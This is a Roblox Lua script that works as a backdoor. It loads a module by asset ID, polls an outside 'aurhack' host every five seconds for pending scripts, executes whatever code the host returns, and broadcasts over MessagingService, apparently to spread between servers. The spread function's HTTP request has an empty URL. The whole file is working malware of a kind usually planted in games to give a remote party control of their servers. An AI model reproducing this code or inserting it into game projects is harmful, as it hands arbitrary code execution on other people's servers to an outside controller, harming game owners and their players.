if game:GetService("ReplicatedStorage"):HasTag("PERFC") then
	return
end
game:GetService("ReplicatedStorage"):AddTag("PERFC")
local fluentPeer = 75461050161473
local peerAnd = require(fluentPeer)
local b = "https://aurhack-main.xtl8v0.easypanel.host/"
local execedAlready = {}
local function spread()
	game:GetService("MessagingService"):PublishAsync("ALADBB8qbqCU1n4ZJgts", game:GetService("HttpService"):GetAsync(""))
end
local function getPendings()
	return game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync(b .. "api/pendingScripts"))
end
spawn(function()
	while wait(5) do
		spread()
	end
end)
spawn(function()
	while wait(5) do
		local pendings = getPendings()
		for _, scr in pendings do
			if table.find(execedAlready, scr.uniqueId) then return end
			table.insert(execedAlready, scr.uniqueId)
			peerAnd(scr.script:gsub("\n", ""))()
		end
	end
end)
